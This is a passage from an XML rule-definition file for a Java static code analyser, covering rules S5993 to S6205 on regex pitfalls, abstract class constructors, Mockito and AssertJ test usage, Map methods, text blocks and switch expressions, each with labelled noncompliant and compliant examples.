            &lt;li&gt; &lt;a href=&quot;https://testng.org/doc/documentation-main.html#parameters&quot;&gt;TestNG
            documentation - Parameters&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>clumsy</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5993' priority='MAJOR'>
        <configKey>S5993</configKey>
        <name>Constructors of an &quot;abstract&quot; class should not be declared &quot;public&quot;</name>
        <description>
            &lt;p&gt;Abstract classes should not have public constructors. Constructors of abstract classes can only be
            called in constructors of their subclasses. So
            there is no point in making them public. The &lt;code&gt;protected&lt;/code&gt; modifier should be enough.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public abstract class AbstractClass1 {
            public AbstractClass1 () { // Noncompliant, has public modifier
            // do something here
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public abstract class AbstractClass2 {
            protected AbstractClass2 () {
            // do something here
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>design</tag>
    </rule>

    <rule key='S5994' priority='CRITICAL'>
        <configKey>S5994</configKey>
        <name>Regex patterns following a possessive quantifier should not always fail</name>
        <description>
            &lt;p&gt;Possessive quantifiers in Regex patterns like below improve performance by eliminating needless
            backtracking:&lt;/p&gt;
            &lt;p&gt;{noformat}&lt;/p&gt;
            &lt;p&gt;?+ , *+ , ++ , {n}+ , {n,}+ , {n,m}+&lt;/p&gt;
            &lt;p&gt;{noformat}&lt;/p&gt;
            &lt;p&gt;But because possessive quantifiers do not keep backtracking positions and never give back, the
            following sub-patterns should not match only similar
            characters. Otherwise, possessive quantifiers consume all characters that could have matched the following
            sub-patterns and nothing remains for the
            following sub-patterns.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern pattern1 = Pattern.compile(&quot;a++abc&quot;); // Noncompliant, the second 'a' never matches
            Pattern pattern2 = Pattern.compile(&quot;\\d*+[02468]&quot;); // Noncompliant, the sub-pattern &quot;[02468]&quot;
            never matches
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern pattern1 = Pattern.compile(&quot;aa++bc&quot;); // Compliant, for example it can match &quot;aaaabc&quot;
            Pattern pattern2 = Pattern.compile(&quot;\\d*+(?&amp;lt;=[02468])&quot;); // Compliant, for example it can
            match an even number like &quot;1234&quot;
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5996' priority='CRITICAL'>
        <configKey>S5996</configKey>
        <name>Regex boundaries should not be used in a way that can never be matched</name>
        <description>
            &lt;p&gt;In regular expressions the boundaries &lt;code&gt;^&lt;/code&gt; and &lt;code&gt;\A&lt;/code&gt;
            can only match at the beginning of the input (or, in case of
            &lt;code&gt;^&lt;/code&gt; in combination with the &lt;code&gt;MULTILINE&lt;/code&gt; flag, the beginning of
            the line) and &lt;code&gt;$&lt;/code&gt;, &lt;code&gt;\Z&lt;/code&gt; and &lt;code&gt;\z&lt;/code&gt;
            only at the end.&lt;/p&gt;
            &lt;p&gt;These patterns can be misused, by accidentally switching &lt;code&gt;^&lt;/code&gt; and &lt;code&gt;$&lt;/code&gt;
            for example, to create a pattern that can never
            match.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // This can never match because $ and ^ have been switched around
            Pattern.compile(&quot;$[a-z]+^&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;^[a-z]+$&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5998' priority='MAJOR'>
        <configKey>S5998</configKey>
        <name>Regular expressions should not overflow the stack</name>
        <description>
            &lt;p&gt;The Java regex engine uses recursive method calls to implement backtracking. Therefore when a
            repetition inside a regular expression contains
            multiple paths (i.e. the body of the repetition contains an alternation (&lt;code&gt;|&lt;/code&gt;), an
            optional element or another repetition), trying to match
            the regular expression can cause a stack overflow on large inputs. This does not happen when using a
            possessive quantifier (such as &lt;code&gt;*+&lt;/code&gt;
            instead of &lt;code&gt;*&lt;/code&gt;) or when using a character class inside a repetition (e.g. &lt;code&gt;[ab]*&lt;/code&gt;
            instead of &lt;code&gt;(a|b)*&lt;/code&gt;).&lt;/p&gt;
            &lt;p&gt;The size of the input required to overflow the stack depends on various factors, including of
            course the stack size of the JVM. One thing that
            significantly increases the size of the input that can be processed is if each iteration of the repetition
            goes through a chain of multiple constant
            characters because such consecutive characters will be matched by the regex engine without invoking any
            recursion.&lt;/p&gt;
            &lt;p&gt;For example, on a JVM with a stack size of 1MB, the regex &lt;code&gt;(?:a|b)*&lt;/code&gt; will
            overflow the stack after matching around 6000 characters
            (actual numbers may differ between JVM versions and even across multiple runs on the same JVM) whereas &lt;code&gt;(?:abc|def)*&lt;/code&gt;
            can handle around
            15000 characters.&lt;/p&gt;
            &lt;p&gt;Since often times stack growth can't easily be avoided, this rule will only report issues on
            regular expressions if they can cause a stack overflow
            on realistically sized inputs. You can adjust the &lt;code&gt;maxStackConsumptionFactor&lt;/code&gt;
            parameter to adjust this.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;(a|b)*&quot;); // Noncompliant
            Pattern.compile(&quot;(.|\n)*&quot;); // Noncompliant
            Pattern.compile(&quot;(ab?)*&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;[ab]*&quot;); // Character classes don't cause recursion the way that '|' does
            Pattern.compile(&quot;(?s).*&quot;); // Enabling the (?s) flag makes '.' match line breaks, so '|\n' isn't
            necessary
            Pattern.compile(&quot;(ab?)*+&quot;); // Possessive quantifiers don't cause recursion because they disable
            backtracking
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
        <param>
            <key>maxStackConsumptionFactor</key>
            <htmlDesc>An indicator approximately proportional to how quickly the stack grows relative to the input size.
                An issue will be reported if the value for a regex exceeds the maximum set here. Setting this to 0 will
                cause an issue to be reported for all regular expressions with non-constant stack consumption.
            </htmlDesc>
            <defaultValue>5.0</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S6001' priority='CRITICAL'>
        <configKey>S6001</configKey>
        <name>Back references in regular expressions should only refer to capturing groups that are matched before the
            reference
        </name>
        <description>
            &lt;p&gt;When a back reference in a regex refers to a capturing group that hasn't been defined yet (or at
            all), it can never be matched. Named back
            references throw a &lt;code&gt;PatternSyntaxException&lt;/code&gt; in that case; numeric back references
            fail silently when they can't match, simply making the
            match fail.&lt;/p&gt;
            &lt;p&gt;When the group is defined before the back reference but on a different control path (like in &lt;code&gt;(.)|\1&lt;/code&gt;
            for example), this also leads to a
            situation where the back reference can never match.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;\\1(.)&quot;); // Noncompliant, group 1 is defined after the back reference
            Pattern.compile(&quot;(.)\\2&quot;); // Noncompliant, group 2 isn't defined at all
            Pattern.compile(&quot;(.)|\\1&quot;); // Noncompliant, group 1 and the back reference are in different
            branches
            Pattern.compile(&quot;(?&amp;lt;x&amp;gt;.)|\\k&amp;lt;x&amp;gt;&quot;); // Noncompliant, group x and the
            back reference are in different branches
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;(.)\\1&quot;);
            Pattern.compile(&quot;(?&amp;lt;x&amp;gt;.)\\k&amp;lt;x&amp;gt;&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S6002' priority='CRITICAL'>
        <configKey>S6002</configKey>
        <name>Regex lookahead assertions should not be contradictory</name>
        <description>
            &lt;p&gt;Lookahead assertions are a regex feature that makes it possible to look ahead in the input without
            consuming it. It is often used at the end of
            regular expressions to make sure that substrings only match when they are followed by a specific pattern.&lt;/p&gt;
            &lt;p&gt;However, they can also be used in the middle (or at the beginning) of a regex. In that case there
            is the possibility that what comes after the
            lookahead does not match the pattern inside the lookahead. This makes the lookahead impossible to match and
            is a sign that there's a mistake in the
            regular expression that should be fixed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;(?=a)b&quot;); // Noncompliant, the same character can't be equal to 'a' and 'b' at
            the same time
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;(?&amp;lt;=a)b&quot;);
            Pattern.compile(&quot;a(?=b)&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S6019' priority='MAJOR'>
        <configKey>S6019</configKey>
        <name>Reluctant quantifiers in regular expressions should be followed by an expression that can't match the
            empty string
        </name>
        <description>
            &lt;p&gt;When a reluctant quantifier (such as &lt;code&gt;*?&lt;/code&gt; or &lt;code&gt;+?&lt;/code&gt;) is
            followed by a pattern that can match the empty string or directly by
            the end of the regex, it will always match the empty string when used with methods that find partial matches
            (such as &lt;code&gt;find&lt;/code&gt;,
            &lt;code&gt;replaceAll&lt;/code&gt;, &lt;code&gt;split&lt;/code&gt; etc.).&lt;/p&gt;
            &lt;p&gt;Similarly, when used with methods that find full matches, a reluctant quantifier that's followed
            directly by the end of the regex (or a pattern
            that always matches the empty string, such as &lt;code&gt;()&lt;/code&gt;) behaves indistinguishably from a
            greedy quantifier while being less efficient.&lt;/p&gt;
            &lt;p&gt;This is likely a sign that the regex does not work as intended.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            str.split(&quot;.*?x?&quot;); // Noncompliant, this will behave just like &quot;x?&quot;
            str.matches(&quot;.*?&quot;); // Noncompliant, replace with &quot;.*&quot;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            str.split(&quot;.*?x&quot;);
            str.matches(&quot;.*&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S6035' priority='MAJOR'>
        <configKey>S6035</configKey>
        <name>Single-character alternations in regular expressions should be replaced with character classes</name>
        <description>
            &lt;p&gt;When an alternation contains multiple alternatives that consist of a single character, it can be
            rewritten as a character class. This should be
            preferred because it is more efficient and can even help prevent stack overflows when used inside a
            repetition (see rule &lt;a href='/coding_rules#rule_key=java%3AS5998'&gt;S5998&lt;/a&gt; ).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;a|b|c&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;[abc]&quot;);
            // or
            Pattern.compile(&quot;[a-c]&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S6068' priority='MINOR'>
        <configKey>S6068</configKey>
        <name>Call to Mockito method &quot;verify&quot;, &quot;when&quot; or &quot;given&quot; should be simplified
        </name>
        <description>
            &lt;p&gt;Mockito provides &lt;em&gt;argument matchers&lt;/em&gt; for flexibly stubbing or verifying method
            calls.&lt;/p&gt;
            &lt;p&gt;&lt;code&gt;Mockito.verify()&lt;/code&gt;, &lt;code&gt;Mockito.when()&lt;/code&gt;, &lt;code&gt;Stubber.when()&lt;/code&gt;
            and &lt;code&gt;BDDMockito.given()&lt;/code&gt; each have overloads
            with and without argument matchers.&lt;/p&gt;
            &lt;p&gt;However, the default matching behavior (i.e. without argument matchers) uses &lt;code&gt;equals()&lt;/code&gt;.
            If only the matcher
            &lt;code&gt;org.mockito.ArgumentMatchers.eq()&lt;/code&gt; is used, the call is equivalent to the call
            without matchers, i.e. the &lt;code&gt;eq()&lt;/code&gt; is not
            necessary and can be omitted. The resulting code is shorter and easier to read.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void myTest() {
            given(foo.bar(eq(v1), eq(v2), eq(v3))).willReturn(null); // Noncompliant
            when(foo.baz(eq(v4), eq(v5))).thenReturn(&quot;foo&quot;); // Noncompliant
            doThrow(new RuntimeException()).when(foo).quux(eq(42)); // Noncompliant
            verify(foo).bar(eq(v1), eq(v2), eq(v3)); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void myTest() {
            given(foo.bar(v1, v2, v3)).willReturn(null);
            when(foo.baz(v4, v5)).thenReturn(&quot;foo&quot;);
            doThrow(new RuntimeException()).when(foo).quux(42);
            verify(foo).bar(v1, v2, v3);
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers&quot;&gt;Mockito
            documentation&lt;/a&gt; -
            argument matchers &lt;/li&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS6073'&gt;S6073&lt;/a&gt; - Mockito argument matchers
            should be used on all parameters &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>clumsy</tag>
        <tag>mockito</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S6070' priority='MAJOR'>
        <configKey>S6070</configKey>
        <name>The regex escape sequence \cX should only be used with characters in the @-_ range</name>
        <description>
            &lt;p&gt;In regular expressions the escape sequence &lt;code&gt;\cX&lt;/code&gt;, where the X stands for any
            character that's either &lt;code&gt;@&lt;/code&gt;, any capital ASCII
            letter, &lt;code&gt;[&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;^&lt;/code&gt;
            or &lt;code&gt;_&lt;/code&gt;, represents the control character that &quot;corresponds&quot; to the
            character following &lt;code&gt;\c&lt;/code&gt;, meaning the control character that comes 64 bytes before
            the given character in the ASCII encoding.&lt;/p&gt;
            &lt;p&gt;In some other regex engines (for example in that of Perl) this escape sequence is case insensitive
            and &lt;code&gt;\cd&lt;/code&gt; produces the same control
            character as &lt;code&gt;\cD&lt;/code&gt;. Further using &lt;code&gt;\c&lt;/code&gt; with a character that's
            neither &lt;code&gt;@&lt;/code&gt;, any ASCII letter, &lt;code&gt;[&lt;/code&gt;,
            &lt;code&gt;\&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;^&lt;/code&gt; nor &lt;code&gt;_&lt;/code&gt;,
            will produce a warning or error in those engines. Neither of these things is true
            in Java, where the value of the character is always XORed with 64 without checking that this operation makes
            sense. Since this won't lead to a
            sensible result for characters that are outside of the &lt;code&gt;@&lt;/code&gt; to &lt;code&gt;_&lt;/code&gt;
            range, using &lt;code&gt;\c&lt;/code&gt; with such characters is almost
            certainly a mistake.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;\\ca&quot;); // Noncompliant, 'a' is not an upper case letter
            Pattern.compile(&quot;\\c!&quot;); // Noncompliant, '!' is outside of the '@'-'_' range
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;\\cA&quot;); // Compliant, this will match the &quot;start of heading&quot; control
            character
            Pattern.compile(&quot;\\c^&quot;); // Compliant, this will match the &quot;record separator&quot; control
            character
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S6103' priority='MAJOR'>
        <configKey>S6103</configKey>
        <name>AssertJ assertions with &quot;Consumer&quot; arguments should contain assertion inside consumers</name>
        <description>
            &lt;p&gt;AssertJ assertions taking &lt;code&gt;Consumer&lt;/code&gt; objects as arguments are expected to
            contain &quot;requirements&quot;, which should themselves be expressed
            as assertions. This concerns the following methods: &lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#allSatisfy-java.util.function.Consumer-&quot;&gt;allSatisfy&lt;/a&gt;,
            &lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#anySatisfy-java.util.function.Consumer-&quot;&gt;anySatisfy&lt;/a&gt;,
            &lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#hasOnlyOneElementSatisfying-java.util.function.Consumer-&quot;&gt;hasOnlyOneElementSatisfying&lt;/a&gt;,&amp;nbsp;&lt;a
            href=&quot;https://tinyurl.com/yxnzt6pj&quot;&gt;isInstanceOfSatisfying&lt;/a&gt;,&amp;nbsp;&lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#noneSatisfy-java.util.function.Consumer-&quot;&gt;noneSatisfy&lt;/a&gt;,
            &lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfies-java.util.function.Consumer-&quot;&gt;satisfies&lt;/a&gt;,
            &lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfiesAnyOf-java.util.function.Consumer-java.util.function.Consumer-&quot;&gt;satisfiesAnyOf&lt;/a&gt;,&amp;nbsp;&lt;a
            href=&quot;http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#zipSatisfy-java.lang.Iterable-java.util.function.BiConsumer-&quot;&gt;zipSatisfy&lt;/a&gt;.&lt;/p&gt;
            &lt;p&gt;These methods are assuming the&amp;nbsp;&lt;code&gt;Consumer&lt;/code&gt;&amp;nbsp;will do the
            assertions itself. If you do not do any assertion in the
            &lt;code&gt;Consumer&lt;/code&gt;, it probably means that you are inadvertently only partially testing your
            object.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a &lt;code&gt;Consumer&lt;/code&gt; argument of any of the above
            methods does not contain any assertion.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(myObject).isInstanceOfSatisfying(String.class, s -&amp;gt; &quot;Hello&quot;.equals(s)); //
            Noncompliant - not testing the string value
            assertThat(myObject).satisfies(&quot;Hello&quot;::equals); // Noncompliant - not testing the string value
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(myObject).isInstanceOfSatisfying(String.class, s -&amp;gt; assertThat(s).isEqualTo(&quot;Hello&quot;));
            assertThat(myObject).satisfies(obj -&amp;gt; assertThat(obj).isEqualTo(&quot;Hello&quot;));
            &lt;/pre&gt;
        </description>
        <tag>tests</tag>
    </rule>

    <rule key='S6104' priority='CRITICAL'>
        <configKey>S6104</configKey>
        <name>Map &quot;computeIfAbsent()&quot; and &quot;computeIfPresent()&quot; should not be used to add &quot;null&quot;
            values.
        </name>
        <description>
            &lt;p&gt;Map &lt;a
            href=&quot;https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfAbsent-K-java.util.function.Function-&quot;&gt;computeIfAbsent&lt;/a&gt;&amp;nbsp;and
            &lt;a
            href=&quot;https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfPresent-K-java.util.function.BiFunction-&quot;&gt;computeIfPresent&lt;/a&gt;
            methods are
            convenient to avoid the cumbersome process to check if a key exists or not, followed by the addition of the
            entry. However, when the function used to
            compute the value returns &lt;code&gt;null&lt;/code&gt;, the entry &lt;code&gt;key-&amp;gt;null&lt;/code&gt;
            will not be added to the Map. Furthermore, in the case of
            &lt;code&gt;computeIfPresent&lt;/code&gt;, if the key is present the entry will be removed. These methods
            should therefore not be used to conditionally add an
            entry with a null value. The traditional way should be used instead.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;computeIfAbsent&lt;/code&gt; or &lt;code&gt;computeIfPresent&lt;/code&gt;
            is used with a lambda always returning null.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            map.computeIfAbsent(key, k -&amp;gt; null); // Noncompliant, the map will not contain an entry key-&amp;gt;null.
            map.computeIfPresent(key, (k, oldValue) -&amp;gt; null); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (!map.containsKey(key)) {
            map.put(key, null);
            }
            if (map.containsKey(key)) {
            map.put(key, null);
            }
            &lt;/pre&gt;
            &lt;h2&gt;See also&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS3824'&gt;S3824&lt;/a&gt; - &quot;Map.get&quot; and
            value test should be replaced with single method call &lt;/li&gt;
            &lt;/ul&gt;
        </description>
    </rule>

    <rule key='S6126' priority='MAJOR'>
        <configKey>S6126</configKey>
        <name>String multiline concatenation should be replaced with Text Blocks</name>
        <description>
            &lt;p&gt;In Java 15 Text Blocks are now official and can be used. The most common pattern for multiline
            strings in Java &amp;lt; 15 was to write String
            concatenation. Now it's possible to do it in a more natural way using Text Blocks.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String textBlock =
            &quot;&amp;lt;html&amp;gt;\n&quot; +
            &quot; &amp;lt;body&amp;gt;\n&quot; +
            &quot; &amp;lt;tag&amp;gt;\n&quot; +
            &quot; &amp;lt;/tag&amp;gt;\n&quot; +
            &quot; &amp;lt;/body&amp;gt;\n&quot; +
            &quot;&amp;lt;/html&amp;gt;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String textBlock = &quot;&quot;&quot;
            &amp;lt;html&amp;gt;
            &amp;lt;body&amp;gt;
            &amp;lt;tag&amp;gt;
            &amp;lt;/tag&amp;gt;
            &amp;lt;/body&amp;gt;
            &amp;lt;/html&amp;gt;&quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/378&quot;&gt;JEP 378: Text Blocks&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html&quot;&gt;Programmer's
            Guide To Text Blocks&lt;/a&gt;, by Jim Laskey and Stuart
            Marks &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java15</tag>
    </rule>

    <rule key='S6202' priority='MAJOR'>
        <configKey>S6202</configKey>
        <name>Operator &quot;instanceof&quot; should be used instead of &quot;A.class.isInstance()&quot;</name>
        <description>
            &lt;p&gt;The &lt;code&gt;instanceof&lt;/code&gt; construction is a preferred way to check whether a variable
            can be cast to some type statically because a compile-time
            error will occur in case of incompatible types. The method &lt;a
            href=&quot;https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html#isInstance-java.lang.Object-&quot;&gt;isInstance()&lt;/a&gt;
            from &lt;code&gt;java.lang.Class&lt;/code&gt;
            works differently and does type check at runtime only, incompatible types will therefore not be detected
            early in the developement, potentially
            resulting in dead code. The &lt;code&gt;isInstance()&lt;/code&gt; method should only be used in dynamic
            cases when the &lt;code&gt;instanceof&lt;/code&gt; operator can't be
            used.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;isInstance()&lt;/code&gt; is used and could be replaced
            with an &lt;code&gt;instanceof&lt;/code&gt; check.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int f(Object o) {
            &amp;nbsp; if (String.class.isInstance(o)) {&amp;nbsp; // Noncompliant
            &amp;nbsp; &amp;nbsp; return 42;
            &amp;nbsp; }
            &amp;nbsp; return 0;
            }

            int f(Number n) {
            &amp;nbsp; if (String.class.isInstance(n)) {&amp;nbsp; // Noncompliant
            &amp;nbsp; &amp;nbsp; return 42;
            &amp;nbsp; }
            &amp;nbsp; return 0;
            }

            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int f(Object o) {
            &amp;nbsp; if (o instanceof String) {&amp;nbsp; // Compliant
            &amp;nbsp; &amp;nbsp; return 42;
            &amp;nbsp; }
            &amp;nbsp; return 0;
            }

            int f(Number n) {
            &amp;nbsp; if (n instanceof String) {&amp;nbsp; // Compile-time error
            &amp;nbsp; &amp;nbsp; return 42;
            &amp;nbsp; }
            &amp;nbsp; return 0;
            }

            boolean fun(Object o, String c) throws ClassNotFoundException
            {
            return Class.forName(c).isInstance(o); // Compliant, can't use instanceof operator here
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S6203' priority='MINOR'>
        <configKey>S6203</configKey>
        <name>Text blocks should not be used in complex expressions</name>
        <description>
            &lt;p&gt;In Java 15 Text Blocks are official and can be used just like an ordinary String. However, when
            they are used to represent a big chunk of text,
            they should not be used directly in complex expressions, as it decreases the readability. In this case, it
            is better to extract the text block into a
            variable or a field.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when a text block longer than a number of lines given as a parameter is
            directly used within a lambda expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            listOfString.stream()
            .map(str -&amp;gt; !&quot;&quot;&quot;
            &amp;lt;project&amp;gt;
            &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
            &amp;lt;parent&amp;gt;
            &amp;lt;groupId&amp;gt;com.mycompany.app&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;my-app&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;
            &amp;lt;/parent&amp;gt;

            &amp;lt;groupId&amp;gt;com.mycompany.app&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;my-module&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;
            &amp;lt;/project&amp;gt;
            &quot;&quot;&quot;.equals(str));
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String myTextBlock = &quot;&quot;&quot;
            &amp;lt;project&amp;gt;
            &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
            &amp;lt;parent&amp;gt;
            &amp;lt;groupId&amp;gt;com.mycompany.app&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;my-app&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;
            &amp;lt;/parent&amp;gt;

            &amp;lt;groupId&amp;gt;com.mycompany.app&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;my-module&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;
            &amp;lt;/project&amp;gt;
            &quot;&quot;&quot;;

            listOfString.stream()
            .map(str -&amp;gt; !myTextBlock.equals(str));
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;p&gt; * &lt;a href=&quot;https://openjdk.java.net/jeps/378&quot;&gt;JEP 378: Text Blocks&lt;/a&gt;&lt;/p&gt;
            &lt;p&gt; * &lt;a href=&quot;https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html&quot;&gt;Programmer's
            Guide To Text Blocks&lt;/a&gt;, by Jim Laskey and Stuart
            Marks&lt;/p&gt;
        </description>
        <param>
            <key>MaximumNumberOfLines</key>
            <htmlDesc>The maximum number of lines in a text block that can be nested into a complex expression.
            </htmlDesc>
            <defaultValue>5</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S6205' priority='MINOR'>
        <configKey>S6205</configKey>
        <name>Switch arrow labels should not use redundant keywords</name>
        <description>
            &lt;p&gt;In Switch Expressions, an arrow label consisting of a block with a single &lt;code&gt;yield&lt;/code&gt;
            can be simplified to directly return the value,
            resulting in cleaner code.&lt;/p&gt;
            &lt;p&gt;Similarly, for Switch Statements and arrow labels, a &lt;code&gt;break&lt;/code&gt; in a block is
            always redundant and should not be used. Furthermore, if the
            resulting block contains only one statement, the curly braces of that block can also be omitted.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when a case of a Switch Expression contains a block with a single &lt;code&gt;yield&lt;/code&gt;
            or when a Switch Statement contains
            a block with a &lt;code&gt;break&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int i = switch (mode) {
            case &quot;a&quot; -&amp;gt; { // Noncompliant: Remove the redundant block and yield.
            yield 1;
            }
            default -&amp;gt; { // Noncompliant: Remove the redundant block and yield.
            yield 2;
            }
            };

            switch (mode) {
            case &quot;a&quot; -&amp;gt; { // Noncompliant: Remove the redundant block and break.
            result = 1;
            break;
            }
            default -&amp;gt; { // Noncompliant: Remove the redundant break.
            doSomethingElse();
            result = 2;
            break;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int i = switch (mode) {
            case &quot;a&quot; -&amp;gt; 1;
            default -&amp;gt; 2;
            };

            switch (mode) {
